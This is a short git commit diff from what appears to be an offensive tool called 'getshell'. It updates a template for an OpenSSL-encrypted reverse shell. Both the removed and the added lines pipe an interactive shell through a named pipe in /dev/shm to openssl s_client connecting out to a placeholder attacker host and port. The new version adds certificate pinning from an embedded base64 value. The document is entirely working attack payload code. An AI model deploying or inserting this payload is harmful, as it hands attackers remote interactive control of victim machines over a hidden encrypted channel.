f462a1786ee26eb7205baebd3f988810584475ac
dadevel <dadevel@disroot.org>
2024-08-12 14:45:32 +0200

    update openssl and add jetty

--- getshell/templates/reverse/connector/openssl-tls.sh
+++ getshell/templates/reverse/connector/openssl-tls.sh
@@ -1,1 +1,4 @@
-rm -f /dev/shm/s;mkfifo /dev/shm/s && /bin/sh -i </dev/shm/s 2>&1 | openssl s_client -quiet -connect {{ LHOST }}:{{ LPORT }} >/dev/shm/s;rm -f /dev/shm/s
+echo SHELL_CRT_ENCODED | base64 -d > /dev/shm/c
+rm -f /dev/shm/s
+mkfifo /dev/shm/s && bash -i < /dev/shm/s 2>&1 | openssl s_client -quiet -CAfile /dev/shm/c -verify_return_error -connect {{ LHOST }}:{{ LPORT }} > /dev/shm/s
+rm -f /dev/shm/s
